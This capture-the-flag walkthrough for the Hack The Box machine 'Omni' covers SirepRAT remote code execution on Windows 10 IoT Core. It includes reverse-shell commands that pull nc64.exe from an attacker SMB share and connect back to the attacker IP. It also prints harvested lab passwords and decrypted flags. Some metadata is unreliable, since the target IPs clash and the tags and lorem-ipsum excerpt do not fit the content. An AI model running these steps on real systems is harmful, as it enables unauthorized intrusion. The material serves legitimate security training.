---
layout: single
title: Omni - Hack The Box
excerpt: "Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry's standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum."
date: 2020-09-02
classes: wide
header:
  teaser: /assets/images/htb-writeup-omni/omni_logo.png
  teaser_home_page: true
  icon: /assets/images/question-mark-white.png
categories:
  - hackthebox
  - infosec
tags:  
  - unknown os
  - mysql
  - mattermost
  - hashcat
  - rules
---

![](/assets/images/htb-writeup-omni/omni_logo.png)

"Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry's standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum."

----------------


   ██╗   ██╗███████╗███████╗██████╗
   ██║   ██║██╔════╝██╔════╝██╔══██╗
   ██║   ██║███████╗█████╗  ██████╔╝
   ██║   ██║╚════██║██╔══╝  ██╔══██╗
   ╚██████╔╝███████║███████╗██║  ██║
    ╚═════╝ ╚══════╝╚══════╝╚═╝  ╚═╝

1. root@nidus:/git/htb# nmap -Pn -sC -sV -n 10.10.10.194
    PORT     STATE SERVICE VERSION
    135/tcp  open  msrpc   Microsoft Windows RPC
    5985/tcp  open  wsman
    8080/tcp open  upnp    Microsoft IIS httpd
    | http-auth:
    | HTTP/1.1 401 Unauthorized\x0D
    |_  Basic realm=Windows Device Portal
    |_http-server-header: Microsoft-HTTPAPI/2.0
    |_http-title: Site doesn't have a title.
    29817/tcp open  unknown
    29819/tcp open  unknown
    29820/tcp open  unknown
    Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows


2. Visiting port 8080 we are met with a login prompt to "Windows Device Portal". Googling about it the default credentials are
   Administrator:p@ssw0rd however they do not work. Reading more tells us this is for OS Windows 10 IoT Core, on Raspberry Pie.

   There are known vulnerabilities and exploits for Win 10 IoT Core, one among them is SirepRAT giving the attacker unauthenticated
   RCE. Reading the In-Depth paper of IoT Core (Linked below) you'll find a lot of great information regarding the webserver,
   how to change Administrator password etc.


3. Download SirepRAT and start to poke the target to verify code execution. I tried to change the Administartor password but got "Access is denied", confirming RCE.

    root@nidus:/git/htb/omni/SirepRAT# python SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --as_logged_on_user --cmd "C:\Windows\System32\cmd.exe" --args " /c net user Administrator 123Abc!"
      <HResultResult | type: 1, payload length: 4, HResult: 0x0>
      <OutputStreamResult | type: 11, payload length: 53, payload peek: 'System error 5 has occurred.Access is denied.'>


    Get a reverse shell, easiest in my opinion is to use nc64.exe from your own SMB-share to trigger a shell.
    root@nidus:/git/htb/omni/SirepRAT# python SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --as_logged_on_user --cmd "C:\Windows\System32\cmd.exe" --args " /c //10.10.14.4/pub-share/nc64.exe 10.10.14.4 4488 -e powershell"

    root@nidus:~# rlwrap nc -lvnp 4488
      listening on [any] 4488 ...
      connect to [10.10.14.4] from (UNKNOWN) [10.10.10.204] 49672
      Windows PowerShell
      Copyright (C) Microsoft Corporation. All rights reserved.

      PS C:\windows\system32>


4. Enumerate the box and instantly we notice that "whoami" doesn't work, nor do we have any valid users in C:\Users.
   We can confirm the user by running "$env:UserName" - giving us user DefaultAccount.

   PS C:\> $env:UserName
      $env:UserName
      DefaultAccount

   PS C:\Users> Get-PSDrive
     Get-PSDrive

     Name           Used (GB)     Free (GB) Provider      Root
     ----           ---------     --------- --------      ----
     Alias                                  Alias
     C                   1.04          0.54 FileSystem    C:\
     Cert                                   Certificate   \
     D                                      FileSystem    D:\
     Env                                    Environment
     Function                               Function
     HKCU                                   Registry      HKEY_CURRENT_USER
     HKLM                                   Registry      HKEY_LOCAL_MACHINE
     U                   0.51          4.37 FileSystem    U:\
     Variable                               Variable
     WSMan                                  WSMan


   With further enumeration we find Users-directories in both C:\Data\Users and U:\Users - however none contain any relevant information.
   I got stuck here for a good while and started to look back on previous boxes, and found that on the box Resolute (also created by
   egre55) there was a hidden file containing valuable data.

   So I started to look in every directory for hidden files, and voiala!

   PS C:\Program Files\WindowsPowerShell\Modules\PackageManagement> get-childitem -Path [rs]* -Force
      get-childitem -Path [rs]* -Force


      Directory: C:\Program Files\WindowsPowerShell\Modules\PackageManagement


      Mode                LastWriteTime         Length Name
      ----                -------------         ------ ----
      -a-h--        8/21/2020  12:56 PM            247 r.bat



    PS C:\Program Files\WindowsPowerShell\Modules\PackageManagement> type r.bat
      type r.bat
      @echo off

      :LOOP

      for /F "skip=6" %%i in ('net localgroup "administrators"') do net localgroup "administrators" %%i /delete

      net user app mesh5143
      net user administrator _1nt3rn37ofTh1nGz

      ping -n 3 127.0.0.1

      cls

      GOTO :LOOP

      :EXIT


5. Change user from DefaultAccount to Administrator and look for user- and root.txt.

  PS C:\> $env:UserName
    DefaultAccount
  PS C:\> $env:computername
    omni
  PS C:\> $user = 'omni\administrator'
  PS C:\> $pass = '_1nt3rn37ofTh1nGz' | ConvertTo-SecureString -AsPlainText -Force
  PS C:\> $creds = New-Object System.Management.Automation.PSCredential($user,$pass)
  PS C:\> Invoke-Command -ComputerName localhost -Credential $creds -ScriptBlock { $env:UserName }
    Administrator
  PS C:\Program Files\WindowsPowerShell\Modules\PackageManagement> Invoke-Command -ComputerName localhost -Credential $creds -ScriptBlock { //10.10.14.4/pub-share/nc64.exe 10.10.14.4 4499 -e powershell }

  root@nidus:/git/htb/omni# rlwrap nc -lvnp 4499
    listening on [any] 4499 ...
    connect to [10.10.14.4] from (UNKNOWN) [10.10.10.204] 49679
    Windows PowerShell
    Copyright (C) Microsoft Corporation. All rights reserved.

    PS C:\Data\Users\administrator\Documents> $env:UserName
      Administrator

Looking for root.txt we can see that it's some how encrypted, same goes with user.txt.

  PS C:\Data\Users\administrator> type root.txt
    <Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04">
      <Obj RefId="0">
        <TN RefId="0">
          <T>System.Management.Automation.PSCredential</T>
          <T>System.Object</T>
        </TN>
        <ToString>System.Management.Automation.PSCredential</ToString>
        <Props>
          <S N="UserName">flag</S>
          <SS N="Password">01000000d08c9ddf0115d1118c7a00c04fc297eb0100000011d9a9af9398c648be30a7dd764d1f3a000000000200000000001066000000010000200000004f4016524600b3914d83c0f88322cbed77ed3e3477dfdc9df1a2a5822021439b000000000e8000000002000020000000dd198d09b343e3b6fcb9900b77eb64372126aea207594bbe5bb76bf6ac5b57f4500000002e94c4a2d8f0079b37b33a75c6ca83efadabe077816aa2221ff887feb2aa08500f3cf8d8c5b445ba2815c5e9424926fca73fb4462a6a706406e3fc0d148b798c71052fc82db4c4be29ca8f78f0233464400000008537cfaacb6f689ea353aa5b44592cd4963acbf5c2418c31a49bb5c0e76fcc3692adc330a85e8d8d856b62f35d8692437c2f1b40ebbf5971cd260f738dada1a7</SS>
        </Props>
      </Obj>
    </Objs>

  PS C:\Data\Users\app> type user.txt
    <Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04">
      <Obj RefId="0">
        <TN RefId="0">
          <T>System.Management.Automation.PSCredential</T>
          <T>System.Object</T>
        </TN>
        <ToString>System.Management.Automation.PSCredential</ToString>
        <Props>
          <S N="UserName">flag</S>
          <SS N="Password">01000000d08c9ddf0115d1118c7a00c04fc297eb010000009e131d78fe272140835db3caa288536400000000020000000000106600000001000020000000ca1d29ad4939e04e514d26b9706a29aa403cc131a863dc57d7d69ef398e0731a000000000e8000000002000020000000eec9b13a75b6fd2ea6fd955909f9927dc2e77d41b19adde3951ff936d4a68ed750000000c6cb131e1a37a21b8eef7c34c053d034a3bf86efebefd8ff075f4e1f8cc00ec156fe26b4303047cee7764912eb6f85ee34a386293e78226a766a0e5d7b745a84b8f839dacee4fe6ffb6bb1cb53146c6340000000e3a43dfe678e3c6fc196e434106f1207e25c3b3b0ea37bd9e779cdd92bd44be23aaea507b6cf2b614c7c2e71d211990af0986d008a36c133c36f4da2f9406ae7</SS>
        </Props>
      </Obj>
    </Objs>

Looking for ways to decrypt this is googled 'powershell password decrypt' and found a Microsoft Devblog covering the subject.
However following the blog post trying to decrypt the files doesn't work. Both root- and user.txt gives the same error:
  "Import-CliXml : Error occurred during a cryptographic operation."

  PS C:\Data\Users\administrator> $Credz = Import-CliXml -Path C:\Data\Users\administrator\root.txt
  $Credz = Import-CliXml -Path C:\Data\Users\administrator\root.txt
  Import-CliXml : Error occurred during a cryptographic operation.
  At line:1 char:10
  + $Credz = Import-CliXml -Path C:\Data\Users\administrator\root.txt
  +          ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
      + CategoryInfo          : NotSpecified: (:) [Import-Clixml], Cryptographic
     Exception
      + FullyQualifiedErrorId : System.Security.Cryptography.CryptographicExcept
     ion,Microsoft.PowerShell.Commands.ImportClixmlCommand

  PS C:\Data\Users\administrator> $Credz = Import-CliXml -Path C:\Data\Users\app\user.txt
  $Credz = Import-CliXml -Path C:\Data\Users\app\user.txt
  Import-CliXml : Error occurred during a cryptographic operation.
  At line:1 char:10
  + $Credz = Import-CliXml -Path C:\Data\Users\app\user.txt
  +          ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
      + CategoryInfo          : NotSpecified: (:) [Import-Clixml], Cryptographic
     Exception
      + FullyQualifiedErrorId : System.Security.Cryptography.CryptographicExcept
     ion,Microsoft.PowerShell.Commands.ImportClixmlCommand

Googling about this it tells that the issue is because of missing machine key in web.config, exact quote:
  "For anyone who hasn't solved their problem, I was missing the "machineKey" entry for encrypt/decrypt in my web.config"


6. So web.config, lets try to approach this from the webb app on port 8080, login with app:mesh5143.
   Press 'Processes' > 'Run Command' and get a reverse shell from your local SMB-share:
    //10.10.14.4/pub-share/nc64.exe 10.10.14.4 4499 -e powershell

    root@nidus:/git/htb/omni# rlwrap nc -lvnp 4499
      listening on [any] 4499 ...
      connect to [10.10.14.4] from (UNKNOWN) [10.10.10.204] 49705
      Windows PowerShell
      Copyright (C) Microsoft Corporation. All rights reserved.

      PS C:\windows\system32> $env:UserName
        app
      PS C:\windows\system32> $Credz = Import-CliXml -Path C:\Data\Users\app\user.txt
      PS C:\windows\system32> $Credz.GetNetworkCredential().Password
        7cfd50f6bc34db3204898f1505ad9d70

   Finally, we got user.txt.


██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████

   ██████╗  ██████╗  ██████╗ ████████╗
   ██╔══██╗██╔═══██╗██╔═══██╗╚══██╔══╝
   ██████╔╝██║   ██║██║   ██║   ██║
   ██╔══██╗██║   ██║██║   ██║   ██║
   ██║  ██║╚██████╔╝╚██████╔╝   ██║
   ╚═╝  ╚═╝ ╚═════╝  ╚═════╝    ╚═╝


1. As we already have the credentials for Administrator, login again on port 8080 (administrator:_1nt3rn37ofTh1nGz) and repeat the
   process to grab root.txt.

   Press 'Processes' > 'Run Command' and get a reverse shell from your local SMB-share:
    //10.10.14.4/pub-share/nc64.exe 10.10.14.4 4499 -e powershell

  root@nidus:/git/htb/omni# rlwrap nc -lvnp 4499
    listening on [any] 4499 ...
    connect to [10.10.14.4] from (UNKNOWN) [10.10.10.204] 49705
    Windows PowerShell
    Copyright (C) Microsoft Corporation. All rights reserved.

    PS C:\windows\system32> $env:UserName
      Administrator
    PS C:\windows\system32> $Credz = Import-CliXml -Path C:\Data\Users\administrator\root.txt
    PS C:\windows\system32> $Credz.GetNetworkCredential().Password
      5dbdce5569e2c4708617c0ce6e9bf11d


██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████

   ██╗███╗   ██╗███████╗ ██████╗ ██████╗ ███╗   ███╗ █████╗ ████████╗██╗ ██████╗ ███╗   ██╗
   ██║████╗  ██║██╔════╝██╔═══██╗██╔══██╗████╗ ████║██╔══██╗╚══██╔══╝██║██╔═══██╗████╗  ██║
   ██║██╔██╗ ██║█████╗  ██║   ██║██████╔╝██╔████╔██║███████║   ██║   ██║██║   ██║██╔██╗ ██║
   ██║██║╚██╗██║██╔══╝  ██║   ██║██╔══██╗██║╚██╔╝██║██╔══██║   ██║   ██║██║   ██║██║╚██╗██║
   ██║██║ ╚████║██║     ╚██████╔╝██║  ██║██║ ╚═╝ ██║██║  ██║   ██║   ██║╚██████╔╝██║ ╚████║
   ╚═╝╚═╝  ╚═══╝╚═╝      ╚═════╝ ╚═╝  ╚═╝╚═╝     ╚═╝╚═╝  ╚═╝   ╚═╝   ╚═╝ ╚═════╝ ╚═╝  ╚═══╝

In-Depth of IoT Core
  https://www.blackhat.com/docs/us-16/materials/us-16-Sabanal-Into-The-Core-In-Depth-Exploration-Of-Windows-10-IoT-Core-wp.pdf

Exploit IoT Core
  https://www.zdnet.com/article/new-exploit-lets-attackers-take-control-of-windows-iot-core-devices/

SirepRAT
  https://github.com/SafeBreach-Labs/SirepRAT

Decrypt PowerShell
  https://devblogs.microsoft.com/scripting/decrypt-powershell-secure-string-password/

Decrypt Error:
  https://stackoverflow.com/questions/25857577/error-occurred-during-a-cryptographic-operation-when-decrypting-forms-cookie
